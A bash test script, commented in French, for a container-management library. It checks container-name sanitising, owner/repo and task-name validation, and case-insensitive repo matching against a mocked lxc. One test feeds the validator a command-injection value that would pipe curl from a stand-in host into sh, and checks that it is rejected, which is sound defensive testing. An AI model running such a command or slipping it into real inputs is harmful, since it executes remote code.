#!/bin/bash
# Tests de scripts/lib/forge-common.sh.
# sanitize_container_name et validate_owner_repo sont du bash pur : testés
# en les exécutant réellement. Le reste (list_forge_containers, etc.)
# appelle lxc : vérifié par grep (structurel), pas par exécution (Task 10).
# Lancer : bash tests/test-forge-common.sh
set -e

LIB="$(cd "$(dirname "$0")/.." && pwd)/scripts/lib/forge-common.sh"
PASS=0
FAIL=0

assert_eq() {
  local desc="$1" actual="$2" expected="$3"
  if [ "$actual" = "$expected" ]; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    echo "FAIL ($desc): got '$actual', expected '$expected'"
  fi
}

assert_contains() {
  if grep -qF -- "$1" "$LIB"; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    echo "FAIL (attendu présent): $1"
  fi
}

echo "bash -n syntax check..."
bash -n "$LIB"

# shellcheck source=lib/forge-common.sh
source "$LIB"

# --- sanitize_container_name ---
assert_eq "simple owner/repo" "$(sanitize_container_name 'moroine/agent-forge')" "agent-moroine-agent-forge"
assert_eq "uppercase collapses" "$(sanitize_container_name 'Moroine/Agent-Forge')" "agent-moroine-agent-forge"
assert_eq "dots collapse to dash" "$(sanitize_container_name 'my.org/my.repo')" "agent-my-org-my-repo"

# --- validate_owner_repo ---
if validate_owner_repo 'moroine/agent-forge' 2>/dev/null; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: valid owner/repo rejected"
fi

if validate_owner_repo 'not-a-repo' 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: invalid owner/repo accepted"
else
  PASS=$((PASS + 1))
fi

# --- validate_task_name ---
if validate_task_name 'my-task_1.2' 2>/dev/null; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: valid task-name rejected"
fi

if validate_task_name 'x$(curl evil.sh|sh)' 2>/dev/null; then
  FAIL=$((FAIL + 1))
  echo "FAIL: task-name with shell metacharacters accepted"
else
  PASS=$((PASS + 1))
fi

# --- discovery / collision helpers: structural (they call lxc) ---
assert_contains 'user.forge.repo'
assert_contains 'user.forge.mode'
assert_contains 'startswith("agent-")'
assert_contains 'container_for_repo'
assert_contains 'check_container_name_collision'
assert_contains 'require_container_for_repo'

# --- case-insensitive repo matching (regression: same repo, different case
# must not be treated as a naming collision or as "not found") ---
# lxc isn't installed here, so mock just enough surface to exercise the real
# functions instead of grepping for the fix.
_MOCK_CONTAINERS='[{"name":"agent-moroine-agent-forge"}]'
lxc() {
  case "$*" in
    "list -f json")
      echo "$_MOCK_CONTAINERS"
      ;;
    "config get agent-moroine-agent-forge user.forge.repo")
      echo "moroine/agent-forge"
      ;;
    "info agent-moroine-agent-forge")
      return 0
      ;;
    *)
      echo "unexpected lxc call: $*" >&2
      return 1
      ;;
  esac
}

if container_for_repo 'Moroine/Agent-Forge' > /dev/null 2>&1; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: container_for_repo should match case-insensitively"
fi

if check_container_name_collision 'agent-moroine-agent-forge' 'Moroine/Agent-Forge' 2>/dev/null; then
  PASS=$((PASS + 1))
else
  FAIL=$((FAIL + 1))
  echo "FAIL: check_container_name_collision should not flag same repo, different case, as a collision"
fi

unset -f lxc

echo ""
echo "PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
